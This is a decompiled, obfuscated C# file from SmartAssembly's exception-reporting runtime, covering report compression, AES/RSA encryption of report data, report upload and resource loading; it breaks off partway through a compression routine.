using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Cryptography;
using System.Security.Permissions;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Web.Services.Protocols;
using System.Windows.Forms;
using _0023M;
using _0023Me;
using _0023P;
using _0023ab;
using _0023fb;
using _0023n;
using _0023p;
using _0023qc;
using _0023w;
using _0023zf;
using SmartAssembly.Shared.ReportHelper;
using SmartAssembly.SmartExceptionsCore;
using _009D_0003_009E_0006;

internal class _0023_0023
{
	static void _0023Af(_0023pd _0023md, _0023Hd _0023nd, string P_2)
	{
		_0023_0023._0023Af(_0023md, _0023nd, P_2, string.Empty);
	}

	static int _0023Bf(_0023nb._0023Gb P_0)
	{
		try
		{
			return P_0._0023e;
		}
		catch (Exception _0023hd)
		{
			_0023_0023._00232f(_0023hd, (object)P_0);
			throw;
		}
	}

	static int _0023Cf(_0023nb._0023Gb P_0)
	{
		try
		{
			return 32768 - P_0._0023e;
		}
		catch (Exception _0023hd)
		{
			_0023_0023._00232f(_0023hd, (object)P_0);
			throw;
		}
	}

	static bool _0023Df(int _0023Ub, _0023nb._0023Vb P_1)
	{
		int num = default(int);
		try
		{
			P_1._0023o[P_1._0023q] = 0;
			byte[] _0023p = P_1._0023p;
			num = P_1._0023q++;
			_0023p[num] = (byte)_0023Ub;
			P_1._0023l._0023a[_0023Ub]++;
			return _0023_0023._0023Mg(P_1);
		}
		catch (Exception _0023hd)
		{
			_0023_0023._0023fg(_0023hd, (object)num, (object)P_1, (object)_0023Ub);
			throw;
		}
	}

	static int _0023Ef(byte[] _0023xb, _0023nb._0023Mb P_1)
	{
		int num = default(int);
		int num2 = default(int);
		int num3 = default(int);
		int num4 = default(int);
		int num5 = default(int);
		try
		{
			num = 0;
			num2 = _0023xb.Length;
			num3 = num2;
			while (true)
			{
				num4 = _0023_0023._0023og(P_1._0023i, _0023xb, num, num2);
				num += num4;
				P_1._0023h += num4;
				num2 -= num4;
				if (num2 == 0 || P_1._0023g == 30)
				{
					break;
				}
				_0023nb._0023ac _0023j = P_1._0023j;
				bool _00239b = (P_1._0023g & 4) != 0;
				bool _00238b = (P_1._0023g & 8) != 0;
				if (_0023_0023._0023ph(_00238b, _00239b, _0023j))
				{
					continue;
				}
				if (P_1._0023g == 16)
				{
					return num3 - num2;
				}
				if (P_1._0023g == 20)
				{
					for (num5 = 8 + (-P_1._0023i.BitCount & 7); num5 > 0; num5 -= 10)
					{
						_0023_0023._0023Pg(P_1._0023i, 2, 10);
					}
					P_1._0023g = 16;
				}
				else if (P_1._0023g == 28)
				{
					_0023_0023._0023yh(P_1._0023i);
					P_1._0023g = 30;
				}
			}
			return num3 - num2;
		}
		catch (Exception _0023hd)
		{
			_0023_0023._0023Kh(_0023hd, (object)num, (object)num2, (object)num3, (object)num4, (object)num5, (object)P_1, (object)_0023xb);
			throw;
		}
	}

	static void _0023Ff(_0023nb._0023Vb._00232b _00231b, _0023nb._0023Vb._00232b P_1)
	{
		int num = default(int);
		int num2 = default(int);
		int num3 = default(int);
		int num4 = default(int);
		int num5 = default(int);
		int num6 = default(int);
		try
		{
			num = -1;
			num2 = 0;
			while (num2 < P_1._0023d)
			{
				num3 = 1;
				num4 = P_1._0023b[num2];
				if (num4 == 0)
				{
					num5 = 138;
					num6 = 3;
				}
				else
				{
					num5 = 6;
					num6 = 3;
					if (num != num4)
					{
						_00231b._0023a[num4]++;
						num3 = 0;
					}
				}
				num = num4;
				num2++;
				while (num2 < P_1._0023d && num == P_1._0023b[num2])
				{
					num2++;
					if (++num3 >= num5)
					{
						break;
					}
				}
				if (num3 < num6)
				{
					_00231b._0023a[num] += (short)num3;
				}
				else if (num != 0)
				{
					_00231b._0023a[16]++;
				}
				else if (num3 <= 10)
				{
					_00231b._0023a[17]++;
				}
				else
				{
					_00231b._0023a[18]++;
				}
			}
		}
		catch (Exception _0023hd)
		{
			_0023_0023._00234f(_0023hd, (object)num5, (object)num6, (object)num3, (object)num, (object)num2, (object)num4, (object)P_1, (object)_00231b);
			throw;
		}
	}

	static Assembly[] _0023Gf(_0023Uc P_0)
	{
		try
		{
			return AppDomain.CurrentDomain.GetAssemblies();
		}
		catch
		{
			return new Assembly[1] { _0023_0023._0023bh() };
		}
	}

	static bool _0023Hf(_0023Uc _0023Nc, string P_1)
	{
		try
		{
			_0023_0023._0023mh(_0023Nc, P_1);
			return true;
		}
		catch (ThreadAbortException)
		{
			return false;
		}
		catch (Exception)
		{
			return false;
		}
	}

	static void _0023If(Exception _0023hd, object _0023Id, object _0023Jd, object _0023Kd, object _0023Ld, object _0023Md, object _0023Nd)
	{
		_0023_0023._0023Ug(_0023hd, new object[6] { _0023Id, _0023Jd, _0023Kd, _0023Ld, _0023Md, _0023Nd });
	}

	static void _0023Jf(_0023nb._0023ic _0023z, int P_1)
	{
		try
		{
			_0023_0023._0023Lh(P_1, _0023z);
			_0023_0023._0023Lh(P_1 >> 16, _0023z);
		}
		catch (Exception _0023hd)
		{
			_0023_0023._00235h(_0023hd, (object)_0023z, (object)P_1);
			throw;
		}
	}

	static bool _0023Kf(bool _00238b, bool _00239b, _0023nb._0023ac P_2)
	{
		int _0023n = default(int);
		int num2 = default(int);
		int num3 = default(int);
		int num4 = default(int);
		bool flag = default(bool);
		try
		{
			if (P_2._0023s < 262 && !_00238b)
			{
				return false;
			}
			while (P_2._0023s >= 262 || _00238b)
			{
				if (P_2._0023s == 0)
				{
					if (P_2._0023p)
					{
						_0023nb._0023Vb _0023z = P_2._0023z;
						int _0023Ub = P_2._0023t[P_2._0023r - 1] & 0xFF;
						_0023_0023._0023Df(_0023Ub, _0023z);
					}
					P_2._0023p = false;
					_0023nb._0023Vb _0023z2 = P_2._0023z;
					byte[] _0023t = P_2._0023t;
					int _0023q = P_2._0023q;
					int num = P_2._0023r - P_2._0023q;
					_0023_0023._0023Fh(_0023t, _0023q, _00239b, _0023z2, num);
					P_2._0023q = P_2._0023r;
					return false;
				}
				if (P_2._0023r >= 65274)
				{
					_0023_0023._0023Tf(P_2);
				}
				_0023n = P_2._0023n;
				num2 = P_2._0023o;
				if (P_2._0023s >= 3)
				{
					num3 = _0023_0023._0023xh(P_2);
					if (num3 != 0 && P_2._0023r - num3 <= 32506 && _0023_0023._0023zh(num3, P_2) && P_2._0023o <= 5 && P_2._0023o == 3 && P_2._0023r - P_2._0023n > 4096)
					{
						P_2._0023o = 2;
					}
				}
				if (num2 >= 3 && P_2._0023o <= num2)
				{
					_0023nb._0023Vb _0023z3 = P_2._0023z;
					int _0023Db = P_2._0023r - 1 - _0023n;
					_0023_0023._0023Tg(_0023Db, num2, _0023z3);
					num2 -= 2;
					do
					{
						P_2._0023r++;
						P_2._0023s--;
						if (P_2._0023s >= 3)
						{
							_0023_0023._0023xh(P_2);
						}
					}
					while (--num2 > 0);
					P_2._0023r++;
					P_2._0023s--;
					P_2._0023p = false;
					P_2._0023o = 2;
				}
				else
				{
					if (P_2._0023p)
					{
						_0023nb._0023Vb _0023z = P_2._0023z;
						int _0023Ub = P_2._0023t[P_2._0023r - 1] & 0xFF;
						_0023_0023._0023Df(_0023Ub, _0023z);
					}
					P_2._0023p = true;
					P_2._0023r++;
					P_2._0023s--;
				}
				if (_0023_0023._0023Mg(P_2._0023z))
				{
					num4 = P_2._0023r - P_2._0023q;
					if (P_2._0023p)
					{
						num4--;
					}
					flag = _00239b && P_2._0023s == 0 && !P_2._0023p;
					_0023nb._0023Vb _0023z2 = P_2._0023z;
					byte[] _0023t = P_2._0023t;
					int _0023q = P_2._0023q;
					_0023_0023._0023Fh(_0023t, _0023q, flag, _0023z2, num4);
					P_2._0023q += num4;
					return !flag;
				}
			}
			return true;
		}
		catch (Exception _0023hd)
		{
			_0023_0023._00234f(_0023hd, (object)_0023n, (object)num2, (object)num3, (object)num4, (object)flag, (object)P_2, (object)_00238b, (object)_00239b);
			throw;
		}
	}

	static Icon _0023Lf(string _0023hb)
	{
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(_0023ab._00239._00237(107392628) + _0023hb + _0023ab._00239._00237(107392567));
			return (manifestResourceStream == null) ? ((Icon)null) : new Icon(manifestResourceStream);
		}
		catch
		{
			return null;
		}
	}

	static void _0023Mf(_0023nb._0023Vb._00232b _00231b, _0023nb._0023Vb._00232b P_1)
	{
		int num = default(int);
		int num2 = default(int);
		int num3 = default(int);
		int num4 = default(int);
		int num5 = default(int);
		int num6 = default(int);
		try
		{
			num = -1;
			num2 = 0;
			while (num2 < _00231b._0023d)
			{
				num3 = 1;
				num4 = _00231b._0023b[num2];
				if (num4 == 0)
				{
					num5 = 138;
					num6 = 3;
				}
				else
				{
					num5 = 6;
					num6 = 3;
					if (num != num4)
					{
						_0023_0023._0023Oh(P_1, num4);
						num3 = 0;
					}
				}
				num = num4;
				num2++;
				while (num2 < _00231b._0023d && num == _00231b._0023b[num2])
				{
					num2++;
					if (++num3 >= num5)
					{
						break;
					}
				}
				if (num3 < num6)
				{
					while (num3-- > 0)
					{
						_0023_0023._0023Oh(P_1, num);
					}
				}
				else if (num != 0)
				{
					_0023_0023._0023Oh(P_1, 16);
					_0023_0023._0023Pg(_00231b._0023h._0023k, num3 - 3, 2);
				}
				else if (num3 <= 10)
				{
					_0023_0023._0023Oh(P_1, 17);
					_0023_0023._0023Pg(_00231b._0023h._0023k, num3 - 3, 3);
				}
				else
				{
					_0023_0023._0023Oh(P_1, 18);
					_0023_0023._0023Pg(_00231b._0023h._0023k, num3 - 11, 7);
				}
			}
		}
		catch (Exception _0023hd)
		{
			_0023_0023._00234f(_0023hd, (object)num5, (object)num6, (object)num3, (object)num, (object)num2, (object)num4, (object)_00231b, (object)P_1);
			throw;
		}
	}

	static void _0023Nf(_0023Vd _0023fe, _0023je P_1)
	{
		if (P_1._0023c == null)
		{
			try
			{
				UploadReportLoginService uploadReportLoginService = new UploadReportLoginService();
				if (P_1._0023d != null)
				{
					((HttpWebClientProtocol)uploadReportLoginService).set_Proxy(P_1._0023d);
				}
				P_1._0023c = uploadReportLoginService.GetServerURL(P_1._0023b);
				if (P_1._0023c.Length == 0)
				{
					throw new ApplicationException(_0023ab._00239._00237(107392526));
				}
				if (P_1._0023c == _0023ab._00239._00237(107392997))
				{
					P_1._0023c = _0023je._0023a;
				}
			}
			catch (Exception ex)
			{
				_0023fe(_0023ab._00239._00237(107393020) + ex.Message);
				return;
			}
		}
		_0023fe(P_1._0023c.StartsWith(_0023ab._00239._00237(107392633)) ? P_1._0023c : _0023ab._00239._00237(107392638));
	}

	static void _0023Of(_0023fd _0023Nc, string P_1)
	{
		if (File.Exists(P_1))
		{
			File.Delete(P_1);
		}
		_0023_0023._0023mh(_0023Nc._0023a, P_1);
	}

	static int _0023Pf(int _0023ob, int _0023pb, _0023nb._0023rb _0023qb, byte[] P_3)
	{
		int num = default(int);
		int num2 = default(int);
		try
		{
			num = 0;
			do
			{
				if (_0023qb._0023r != 11)
				{
					num2 = _0023_0023._0023sh(_0023ob, _0023pb, P_3, _0023qb._0023y);
					_0023ob += num2;
					num += num2;
					_0023pb -= num2;
					if (_0023pb == 0)
					{
						return num;
					}
				}
			}
			while (_0023_0023._0023kh(_0023qb) || (_0023_0023._0023Bf(_0023qb._0023y) > 0 && _0023qb._0023r != 11));
			return num;
		}
		catch (Exception _0023hd)
		{
			_0023_0023._0023If(_0023hd, (object)num, (object)num2, (object)_0023qb, (object)P_3, (object)_0023ob, (object)_0023pb);
			throw;
		}
	}

	static byte[] _0023Qf(_0023Uc P_0)
	{
		return P_0._0023Ic();
	}

	static byte[] _0023Rf(byte[] _0023lb, byte[] _0023mb, _0023gb _0023hb, byte[] _0023ib)
	{
		_0023nb._0023ic _0023ic = default(_0023nb._0023ic);
		int i = default(int);
		byte[] array3 = default(byte[]);
		long position = default(long);
		_0023nb._0023Mb _0023Mb = default(_0023nb._0023Mb);
		byte[] array4 = default(byte[]);
		int num = default(int);
		byte[] array5 = default(byte[]);
		int num2 = default(int);
		long position2 = default(long);
		byte[] array = default(byte[]);
		ICryptoTransform cryptoTransform = default(ICryptoTransform);
		byte[] array2 = default(byte[]);
		byte[] array6 = default(byte[]);
		Exception ex2 = default(Exception);
		try
		{
			try
			{
				_0023ic = new _0023nb._0023ic();
				switch (_0023hb)
				{
				case _0023gb._0023b:
					_0023_0023._0023Jf(_0023ic, 25000571);
					_0023_0023._0023Jf(_0023ic, _0023ib.Length);
					for (i = 0; i < _0023ib.Length; i += array3.Length)
					{
						array3 = new byte[Math.Min(2097151, _0023ib.Length - i)];
						Buffer.BlockCopy(_0023ib, i, array3, 0, array3.Length);
						position = _0023ic.Position;
						_0023_0023._0023Jf(_0023ic, 0);
						_0023_0023._0023Jf(_0023ic, array3.Length);
						_0023Mb = new _0023nb._0023Mb();
						_0023_0023._0023Th(_0023Mb, array3);
						while (!_0023Mb.IsNeedingInput)
						{
							array4 = new byte[512];
							num = _0023_0023._0023Ef(array4, _0023Mb);
							if (num <= 0)
							{
								break;
							}
							_0023ic.Write(array4, 0, num);
						}
						_0023_0023._00232g(_0023Mb);
						while (!_0023Mb.IsFinished)
						{
							array5 = new byte[512];
							num2 = _0023_0023._0023Ef(array5, _0023Mb);
							if (num2 <= 0)
							{
								break;
							}
							_0023ic.Write(array5, 0, num2);
						}
						position2 = _0023ic.Position;
						_0023ic.Position = position;
						_0023_0023._0023Jf(_0023ic, (int)_0023Mb.TotalOut);
						_0023ic.Position = position2;
					}
					break;
				case _0023gb._0023d:
					_0023_0023._0023Jf(_0023ic, 58555003);
					array = _0023_0023._0023Rf((byte[])null, (byte[])null, _0023gb._0023b, _0023ib);
					cryptoTransform = _0023_0023._00231h(_0023hb: false, _0023mb, _0023lb);
					try
					{
						array2 = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
						_0023ic.Write(array2, 0, array2.Length);
					}
					finally
					{
						cryptoTransform?.Dispose();
					}
					break;
				default:
					throw new ArgumentOutOfRangeException("algorithm", _0023hb, "Selected compression algorithm is not supported.");
				}
				_0023ic.Flush();
				_0023ic.Close();
				array6 = _0023ic.ToArray();
				return array6;
			}
			catch (Exception ex)
			{
				ex2 = ex;
				_0023nb._0023a = "ERR 2003: " + ex2.Message;
				throw;
			}
		}
		catch (Exception _0023Sd)
		{
			_0023_0023._0023Ug(_0023Sd, new object[19]
			{
				_0023ic, i, array3, position, _0023Mb, position2, array4, num, array5, num2,
				array, cryptoTransform, array2, array6, ex2, _0023ib, _0023hb, _0023lb, _0023mb
			});
			throw;
		}
	}

	static void _0023Sf(int _0023Fb, int _0023pb, byte[] _0023qb, _0023nb._0023Gb P_3)
	{
		try
		{
			if (P_3._0023e > 0)
			{
				throw new InvalidOperationException();
			}
			if (_0023Fb > 32768)
			{
				_0023pb += _0023Fb - 32768;
				_0023Fb = 32768;
			}
			Array.Copy(_0023qb, _0023pb, P_3._0023c, 0, _0023Fb);
			P_3._0023d = _0023Fb & 0x7FFF;
		}
		catch (Exception _0023hd)
		{
			_0023_0023._0023Vg(_0023hd, (object)P_3, (object)_0023qb, (object)_0023pb, (object)_0023Fb);
			throw;
		}
	}

	static void _0023Tf(_0023nb._0023ac P_0)
	{
		int i = default(int);
		int num = default(int);
		int j = default(int);
		int num2 = default(int);
		try
		{
			Array.Copy(P_0._0023t, 32768, P_0._0023t, 0, 32768);
			P_0._0023n -= 32768;
			P_0._0023r -= 32768;
			P_0._0023q -= 32768;
			for (i = 0; i < 32768; i++)
			{
				num = P_0._0023l[i] & 0xFFFF;
				P_0._0023l[i] = (short)((num >= 32768) ? (num - 32768) : 0);
			}
			for (j = 0; j < 32768; j++)
			{
				num2 = P_0._0023m[j] & 0xFFFF;
				P_0._0023m[j] = (short)((num2 >= 32768) ? (num2 - 32768) : 0);
			}
		}
		catch (Exception _0023hd)
		{
			_0023_0023._0023Dg(_0023hd, (object)i, (object)num, (object)j, (object)num2, (object)P_0);
			throw;
		}
	}

	static Bitmap _0023Uf(string _0023hb)
	{
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(_0023ab._00239._00237(107392628) + _0023hb + _0023ab._00239._00237(107392971));
			return (manifestResourceStream == null) ? ((Bitmap)null) : new Bitmap(manifestResourceStream);
		}
		catch
		{
			return null;
		}
	}

	static void _0023Vf(_0023je _0023Xc, IWebProxy P_1)
	{
		_0023Xc._0023d = P_1;
	}

	static void _0023Wf(_0023fd P_0)
	{
		P_0._0023d = false;
	}

	static byte[] _0023Xf(byte[] _0023kb, string _0023uc)
	{
		if (_0023uc.StartsWith(_0023ab._00239._00237(107394708)))
		{
			_0023vc._0023a = _0023ab._00239._00237(107392962);
			return null;
		}
		AesCryptoServiceProvider aesCryptoServiceProvider = null;
		RSACryptoServiceProvider rSACryptoServiceProvider = null;
		MemoryStream memoryStream = null;
		CryptoStream cryptoStream = null;
		try
		{
			aesCryptoServiceProvider = new AesCryptoServiceProvider();
			rSACryptoServiceProvider = new RSACryptoServiceProvider();
			rSACryptoServiceProvider.FromXmlString(_0023uc);
			aesCryptoServiceProvider.GenerateKey();
			aesCryptoServiceProvider.GenerateIV();
			byte[] array = new byte[48];
			Buffer.BlockCopy(aesCryptoServiceProvider.Key, 0, array, 0, 32);
			Buffer.BlockCopy(aesCryptoServiceProvider.IV, 0, array, 32, 16);
			memoryStream = new MemoryStream();
			try
			{
				byte[] array2 = rSACryptoServiceProvider.Encrypt(array, fOAEP: false);
				memoryStream.WriteByte(1);
				memoryStream.WriteByte(Convert.ToByte(array2.Length / 8));
				memoryStream.Write(array2, 0, array2.Length);
			}
			catch (CryptographicException)
			{
				try
				{
					byte[] array3 = new byte[16];
					byte[] array4 = new byte[16];
					Buffer.BlockCopy(aesCryptoServiceProvider.Key, 0, array3, 0, 16);
					Buffer.BlockCopy(aesCryptoServiceProvider.Key, 16, array4, 0, 16);
					byte[] array5 = rSACryptoServiceProvider.Encrypt(array3, fOAEP: false);
					byte[] array6 = rSACryptoServiceProvider.Encrypt(array4, fOAEP: false);
					byte[] array7 = rSACryptoServiceProvider.Encrypt(aesCryptoServiceProvider.IV, fOAEP: false);
					memoryStream.WriteByte(2);
					memoryStream.WriteByte(Convert.ToByte(array5.Length / 8));
					memoryStream.Write(array5, 0, array5.Length);
					memoryStream.Write(array6, 0, array6.Length);
					memoryStream.Write(array7, 0, array7.Length);
				}
				catch (CryptographicException)
				{
					_0023vc._0023a = _0023ab._00239._00237(107392869);
					return null;
				}
			}
			cryptoStream = new CryptoStream(memoryStream, aesCryptoServiceProvider.CreateEncryptor(), CryptoStreamMode.Write);
			cryptoStream.Write(_0023kb, 0, _0023kb.Length);
			cryptoStream.FlushFinalBlock();
			return memoryStream.ToArray();
		}
		catch (Exception ex3)
		{
			_0023vc._0023a = _0023ab._00239._00237(107392183) + ex3.Message;
			return null;
		}
		finally
		{
			aesCryptoServiceProvider?.Clear();
			rSACryptoServiceProvider?.Clear();
			memoryStream?.Close();
			cryptoStream?.Close();
		}
	}

	static int _0023Yf(_0023nb._0023Ib _0023Eb, _0023nb._0023Ab P_1)
	{
		int num = default(int);
		int num2 = default(int);
		int num3 = default(int);
		int num4 = default(int);
		int num5 = default(int);
		int num6 = default(int);
		try
		{
			if ((num = _0023_0023._0023hg(P_1, 9)) >= 0)
			{
				if ((num2 = _0023Eb._0023b[num]) >= 0)
				{
					_0023_0023._0023th(P_1, num2 & 0xF);
					return num2 >> 4;
				}
				num3 = -(num2 >> 4);
				num4 = num2 & 0xF;
				if ((num = _0023_0023._0023hg(P_1, num4)) >= 0)
				{
					num2 = _0023Eb._0023b[num3 | (num >> 9)];
					_0023_0023._0023th(P_1, num2 & 0xF);
					return num2 >> 4;
				}
				num5 = P_1.AvailableBits;
				num = _0023_0023._0023hg(P_1, num5);
				num2 = _0023Eb._0023b[num3 | (num >> 9)];
				if ((num2 & 0xF) <= num5)
				{
					_0023_0023._0023th(P_1, num2 & 0xF);
					return num2 >> 4;
				}
				return -1;
			}
			num6 = P_1.AvailableBits;
			num = _0023_0023._0023hg(P_1, num6);
			num2 = _0023Eb._0023b[num];
			if (num2 >= 0 && (num2 & 0xF) <= num6)
			{
				_0023_0023._0023th(P_1, num2 & 0xF);
				return num2 >> 4;
			}
			return -1;
		}
		catch (Exception _0023hd)
		{
			_0023_0023._00234f(_0023hd, (object)num, (object)num2, (object)num3, (object)num4, (object)num5, (object)num6, (object)_0023Eb, (object)P_1);
			throw;
		}
	}

	static string _0023Zf(Version _0023F)
	{
		return string.Format(_0023ab._00239._00237(107392134), _0023F.Major, _0023F.Minor, _0023F.Build, _0023F.Revision);
	}

	static void _0023Af(_0023pd _0023md, _0023Hd P_1)
	{
		_0023_0023._0023Af(_0023md, P_1, string.Empty);
	}

	static void _00230f(_0023ee _0023Xc, IWebProxy P_1)
	{
		_0023Xc._0023f = P_1;
	}

	[DllImport("kernel32.Dll", EntryPoint = "GetVersionEx")]
	static extern short _00231f(ref _0023Fe._0023vf _0023wc);

	static void _00232f(Exception _0023hd, object _0023Id)
	{
		_0023_0023._0023Ug(_0023hd, new object[1] { _0023Id });
	}

	static Icon _00233f()
	{
		try
		{
			return _0023_0023._0023mg();
		}
		catch (Exception)
		{
			return _0023_0023._0023Lf(_0023ab._00239._00237(107392121));
		}
	}

	static void _00234f(Exception _0023hd, object _0023Id, object _0023Jd, object _0023Kd, object _0023Ld, object _0023Md, object _0023Nd, object _0023Od, object _0023Pd)
	{
		_0023_0023._0023Ug(_0023hd, new object[8] { _0023Id, _0023Jd, _0023Kd, _0023Ld, _0023Md, _0023Nd, _0023Od, _0023Pd });
	}

	static int _00235f(string _0023Hc, _0023Uc P_1)
	{
		try
		{
			bool flag = P_1._0023i[0] == '\u0001';
			if (_0023Hc == null || _0023Hc.Length == 0 || (flag && _0023Hc.Length > 4) || (!flag && _0023Hc[0] != '#'))
			{
				return -1;
			}
			int num = 0;
			int num2 = _0023Hc.Length - 1;
			while (num2 >= 0 && (flag || num2 != 0))
			{
				char c = _0023Hc[num2];
				bool flag2 = false;
				for (int i = 0; i < P_1._0023i.Length; i++)
				{
					if (P_1._0023i[i] == c)
					{
						num = num * P_1._0023i.Length + i;
						flag2 = true;
						break;
					}
				}
				if (!flag2)
				{
					return -1;
				}
				num2--;
			}
			return num;
		}
		catch
		{
			return -1;
		}
	}

	static void _00236f(out string _0023G, ref bool _0023H, ref string _0023F, ref _0023L _0023I, out Version _0023J, out Version _0023K)
	{
		_0023I = OsInformation._0096_0003_009E_0006();
		_0023K = OsInformation._0011_009A_000F_0003(_0023I, _0023K);
		_0023G = _0023_0023._0023Zf(_0023K);
		_0023H = OsVersionInformation.IsX64;
	}

	static void _00237f(_0023Uc P_0)
	{
		try
		{
			string tempFileName = Path.GetTempFileName();
			_0023_0023._0023Hf(P_0, tempFileName);
			Process.Start(Path.Combine(_0023_0023._0023fh(), _0023ab._00239._00237(107392076)), _0023ab._00239._00237(107392083) + tempFileName + _0023ab._00239._00237(107394666));
			if (P_0._0023v != null)
			{
				P_0._0023v(P_0, EventArgs.Empty);
			}
		}
		catch (ThreadAbortException)
		{
		}
		catch (Exception _00234c)
		{
			_0023_0023._0023Yg(new _00233c(_00234c), P_0);
		}
	}

	static void _00238f(bool _0023Qb, byte[] _0023Rb, int _0023Sb, int _0023Tb, _0023nb._0023Vb P_4)
	{
		try
		{
			_0023_0023._0023Pg(P_4._0023k, _0023Qb ? 1 : 0, 3);
			_0023_0023._0023yh(P_4._0023k);
			_0023_0023._0023Sh(P_4._0023k, _0023Tb);
			_0023_0023._0023Sh(P_4._0023k, ~_0023Tb);
			_0023_0023._0023Ig(_0023Sb, _0023Tb, P_4._0023k, _0023Rb);
			_0023_0023._0023rh(P_4);
		}
		catch (Exception _0023hd)
		{
			_0023_0023._0023Dg(_0023hd, (object)P_4, (object)_0023Rb, (object)_0023Sb, (object)_0023Tb, (object)_0023Qb);
			throw;
		}
	}

	static void _00239f(_0023fd P_0)
	{
		P_0._0023c = true;
	}

	[SecurityPermission(SecurityAction.Demand, UnmanagedCode = true)]
	static void _0023ag(_0023ee _0023Zd)
	{
		if (_0023Zd != null)
		{
			_0023ee._0023e = _0023Zd;
			AppDomain.CurrentDomain.UnhandledException += _0023Zd._00233d;
			Application.add_ThreadException((ThreadExceptionEventHandler)_0023Zd._00231d);
		}
	}

	static int _0023bg(_0023Uc._0023ef _0023Fc, _0023Uc P_1)
	{
		string key = _0023Fc._0023b._0023a.ToUpper();
		if (P_1._0023q.ContainsKey(key))
		{
			return P_1._0023q[key];
		}
		int count = P_1._0023p.Count;
		P_1._0023p.Add(_0023Fc._0023b);
		P_1._0023q.Add(key, count);
		return count;
	}

	static byte[] _0023cg(byte[] _0023lb)
	{
		_0023nb._0023ic _0023ic = default(_0023nb._0023ic);
		byte[] array = default(byte[]);
		int num2 = default(int);
		_0023gb _0023gb = default(_0023gb);
		int num3 = default(int);
		int i = default(int);
		int num4 = default(int);
		int num5 = default(int);
		byte[] array4 = default(byte[]);
		byte[] array2 = default(byte[]);
		byte[] array3 = default(byte[]);
		ICryptoTransform cryptoTransform = default(ICryptoTransform);
		try
		{
			_0023ic = new _0023nb._0023ic(_0023lb);
			array = new byte[0];
			int num = _0023_0023._0023jg(_0023ic);
			num2 = num >> 24;
			if (num - (num2 << 24) == 8223355)
			{
				_0023gb = (_0023gb)num2;
				switch (_0023gb)
				{
				case _0023gb._0023b:
					num3 = _0023_0023._0023jg(_0023ic);
					array = new byte[num3];
					for (i = 0; i < num3; i += num5)
					{
						num4 = _0023_0023._0023jg(_0023ic);
						num5 = _0023_0023._0023jg(_0023ic);
						array4 = new byte[num4];
						_0023ic.Read(array4, 0, array4.Length);
						_0023_0023._0023Pf(i, num5, new _0023nb._0023rb(array4), array);
					}
					break;
				case _0023gb._0023d:
					array2 = new byte[16]
					{
						96, 22, 128, 140, 65, 244, 37, 101, 50, 238,
						75, 243, 81, 8, 35, 86
					};
					array3 = new byte[16]
					{
						207, 26, 215, 121, 45, 70, 227, 60, 40, 252,
						163, 6, 53, 200, 35, 174
					};
					cryptoTransform = _0023_0023._00231h(_0023hb: true, array3, array2);
					try
					{
						array = _0023_0023._0023cg(cryptoTransform.TransformFinalBlock(_0023lb, 4, _0023lb.Length - 4));
					}
					finally
					{
						cryptoTransform?.Dispose();
					}
					break;
				default:
					throw new ArgumentOutOfRangeException("version", num2, "Selected compression algorithm is not supported.");
				}
				_0023ic.Close();
				_0023ic = null;
				return array;
			}
			throw new FormatException("Unknown Header");
		}
		catch (Exception _0023Sd)
		{
			_0023_0023._0023Ug(_0023Sd, new object[13]
			{
				_0023ic, array, num2, _0023gb, num3, i, num4, num5, array4, array2,
				array3, cryptoTransform, _0023lb
			});
			throw;
		}
	}

	static void _0023Af(_0023pd _0023md, _0023Hd _0023nd, string _0023od, string P_3)
	{
		_0023md._0023e?.Invoke(_0023md, new _0023Gd(_0023nd, _0023od, P_3));
	}

	static void _0023dg(object[] _0023hd, Exception _0023Td)
	{
		try
		{
			if (_0023Td.GetType() == typeof(Exception) && _0023Td.Message == _0023ab._00239._00237(107392054))
			{
				_0023Td = _0023Td.InnerException;
			}
			else
			{
				_0023_0023._0023Ug(_0023Td, _0023hd);
			}
			_0023ee.Handler._00236d(_0023Td, _0023zd: true, _00237d: true);
		}
		catch
		{
		}
	}

	static void _0023eg(_0023nb._0023ac P_0)
	{
		try
		{
			P_0._0023k = (P_0._0023t[P_0._0023r] << 5) ^ P_0._0023t[P_0._0023r + 1];
		}
		catch (Exception _0023hd)
		{
			_0023_0023._00232f(_0023hd, (object)P_0);
			throw;
		}
	}

	static void _0023fg(Exception _0023hd, object _0023Id, object _0023Jd, object _0023Kd)
	{
		_0023_0023._0023Ug(_0023hd, new object[3] { _0023Id, _0023Jd, _0023Kd });
	}

	static void _0023gg(_0023nb._0023Vb._00232b _00230b, int[] P_1)
	{
		int num = default(int);
		int num2 = default(int);
		int num3 = default(int);
		int i = default(int);
		int[] array = default(int[]);
		int num4 = default(int);
		int num5 = default(int);
		int num6 = default(int);
		int num7 = default(int);
		int num8 = default(int);
		int num9 = default(int);
		int num10 = default(int);
		int num11 = default(int);
		int num12 = default(int);
		try
		{
			_00230b._0023b = new byte[_00230b._0023a.Length];
			num = P_1.Length / 2;
			num2 = (num + 1) / 2;
			num3 = 0;
			for (i = 0; i < _00230b._0023g; i++)
			{
				_00230b._0023f[i] = 0;
			}
			array = new int[num];
			array[num - 1] = 0;
			for (num4 = num - 1; num4 >= 0; num4--)
			{
				if (P_1[2 * num4 + 1] != -1)
				{
					num5 = array[num4] + 1;
					if (num5 > _00230b._0023g)
					{
						num5 = _00230b._0023g;
						num3++;
					}
					num6 = (array[P_1[2 * num4]] = (array[P_1[2 * num4 + 1]] = num5));
				}
				else
				{
					num7 = array[num4];
					_00230b._0023f[num7 - 1]++;
					_00230b._0023b[P_1[2 * num4]] = (byte)array[num4];
				}
			}
			if (num3 == 0)
			{
				return;
			}
			num8 = _00230b._0023g - 1;
			while (true)
			{
				if (_00230b._0023f[--num8] != 0)
				{
					do
					{
						_00230b._0023f[num8]--;
						_00230b._0023f[++num8]++;
						num3 -= 1 << _00230b._0023g - 1 - num8;
					}
					while (num3 > 0 && num8 < _00230b._0023g - 1);
					if (num3 <= 0)
					{
						break;
					}
				}
			}
			_00230b._0023f[_00230b._0023g - 1] += num3;
			_00230b._0023f[_00230b._0023g - 2] -= num3;
			num9 = 2 * num2;
			for (num10 = _00230b._0023g; num10 != 0; num10--)
			{
